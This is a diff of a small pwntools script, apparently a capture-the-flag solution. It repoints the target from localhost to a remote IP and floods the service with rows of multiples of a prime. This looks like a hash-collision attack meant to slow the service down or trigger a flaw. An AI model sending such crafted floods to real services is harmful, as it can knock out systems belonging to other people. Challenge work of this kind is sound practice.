@@ -1,17 +1,20 @@
 from pwn import *
 
-p = remote("localhost", 4001)
+ip = "104.248.97.237"
+# p = remote("localhost", 4001)
+p = remote(ip, 1343)
 lines = []
 row = []
 prime = 10273 
+# prime = 20753
 # 20753 also not bad
-for i in range(1,10000-50):
-    row.append(str(i*10273))
+for i in range(1,10000):
+    row.append(str(i*prime))
     if i % 10 == 0:
         lines.append('1')
         lines.append(' '.join(row))
         row.clear()
-# lines.append('2')
+lines.append('2')
 for str_line in lines:
     p.sendline(str_line.encode('utf-8'))
 p.interactive()
